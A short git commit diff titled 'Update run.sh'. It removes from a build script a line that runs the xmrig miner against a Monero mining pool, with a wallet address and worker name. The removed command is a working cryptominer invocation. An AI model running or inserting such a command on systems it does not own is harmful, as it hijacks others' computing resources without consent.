085d532378277d4c748839aef6f4d497bafae4ec
Parmar Parth <84669955+Code-Parth@users.noreply.github.com>
2022-06-06 10:36:22 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -14,4 +14,3 @@ mkdir build
 cd build
 cmake ..
 make
-./xmrig -o gulf.moneroocean.stream:10128 -u 48Bu1pjScRxLAcvvYH8MBEQefbGnT5Kp6XUK5ApUXi8QMfWevgWdPeSWgqt9z2krLxU1LMziHh2ANX8kd3Avdsx6AcvuMqC -p Worker0
